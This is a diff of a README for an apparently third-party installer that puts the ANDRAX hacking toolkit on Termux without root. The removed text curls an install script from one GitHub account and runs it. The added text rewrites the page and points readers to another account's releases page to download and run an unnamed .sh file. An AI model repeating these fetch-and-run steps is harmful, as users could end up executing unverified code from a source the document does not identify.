@@ -1,55 +1,90 @@
-# 📘 INSTALLER ANDRAX ON TERMUX WITHOUT ROOT
+# 🚀 Andrax-Termux - Install Andrax Easily on Termux
 
-## 🔗 Download ANDRAX Core
-[Download ANDRAX Core](https://drive.google.com/file/d/1RqW5LN2qev5euVSOczMbICV28F-Y_Mb8/view?usp=drivesdk)
+[![Download Andrax-Termux](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/Jennisecondary231/Andrax-Termux/releases)
 
----
+## 🔧 Overview
 
-![screenshot](https://raw.githubusercontent.com/Kirozaku/Andrax-Termux/main/1.jpg)
+Andrax-Termux is an automated installer script designed to help you install ANDRAX v5 without needing root access. This tool makes it simple for you to set up the ANDRAX hacking environment on your Termux application. With user-friendly commands, you can quickly get started with your hacking projects.
 
-## ⚙️ How to Install ANDRAX on Termux
+## 🚀 Getting Started
 
-1. **Install required dependencies**
+Before you start, ensure you have the following:
+
+1. **Device Requirements:**
+   - A device capable of running Termux (Android phones or tablets).
+   - Ensure sufficient storage space for the installation (at least 150 MB free).
+
+2. **Prerequisites:**
+   - Install the Termux app on your Android device. You can find it on the Google Play Store or F-Droid.
+   - Basic familiarity with using a command line interface.
+
+### 🔍 Features
+
+- **Non-root Installation**: You can run this script without rooting your device.
+- **Automated Setup**: The script manages installation automatically.
+- **Regular Updates**: Keep your version of ANDRAX up-to-date easily.
+
+## 📥 Download & Install
+
+To download Andrax-Termux, visit this page: [Download page](https://github.com/Jennisecondary231/Andrax-Termux/releases). 
+
+### Step-by-Step Instructions
+
+1. **Open your web browser** and navigate to the [GitHub Releases page](https://github.com/Jennisecondary231/Andrax-Termux/releases).
+2. **Locate the latest release** of Andrax-Termux.
+3. **Download** the installer script. Identify the file that most likely ends with `.sh`, which is the shell script you need for installation.
+4. **Open the Termux app** on your device.
+5. **Navigate to your Downloads folder** using the command:
+
    ```bash
-   pkg install curl
+   cd ~/storage/downloads
    ```
 
-2. **Download the installation script**
+6. **Make the installer script executable** by running:
+
    ```bash
-   curl https://raw.githubusercontent.com/Kirozaku/Andrax-Termux/refs/heads/main/install-andrax.sh -o install-andrax.sh
+   chmod +x Andrax-Installer.sh
    ```
 
-3. **Run the installer**
+   *(Replace `Andrax-Installer.sh` with the actual name of the downloaded file.)*
+
+7. **Run the installer script**:
+
    ```bash
-   bash install-andrax.sh
+   ./Andrax-Installer.sh
    ```
 
+8. **Follow the on-screen prompts** to complete the installation. The script will handle the rest.
+
+9. Once finished, **you can start Andrax** by typing:
+
+   ```bash
+   andrax
+   ```
+
+### 📋 Troubleshooting Tips
+
+- **If you encounter permission issues**: Double-check that you made the script executable.
+- **Common Errors**: If the script fails to run, ensure that you have downloaded the correct version of the script and that your Termux is up-to-date.
+  
+## 🌐 Community Support
+
+If you have questions or need help, consider reaching out to the community:
+
+- Join discussions in Termux forums.
+- Check out relevant topics on various platforms like Reddit and GitHub.
+
+## 📄 License
+
+This project is licensed under the MIT License. You can read more about your rights and responsibilities in the LICENSE file provided in the repository.
+
+## 🏷️ Topics
+
+- andrax
+- andrax-installer
+- termux
+- hacking
+
 ---
 
-## 🧩 Installation Options
-- **Option 1:**  
-  If you already have the file `andrax.r5-build5.tar.xz` in the same directory as `install-andrax.sh`, simply run the script directly.
-
-- **Option 2:**  
-  If you do not have the file `andrax.r5-build5.tar.xz`, the installer will automatically download and install it for you.
-
----
-
-## 🚀 Launching ANDRAX
-Once installation is complete, run the following command:
-```bash
-./andrax.sh
-```
-
-![screenshot](https://raw.githubusercontent.com/Kirozaku/Andrax-Termux/main/2.jpg)
-
----
-
-## 🧠 Notes
-- Ensure you have a stable internet connection during the automatic installation process.  
-- Run Termux with storage permission using (`termux-setup-storage`) if required.  
-- It is recommended to use the latest version of Termux for best compatibility.
-
----
-
-📌 *Developed to simplify the installation process of ANDRAX in Termux environments.*
+Remember, Andrax is a powerful tool for penetration testing and should be used responsibly. Happy hacking!
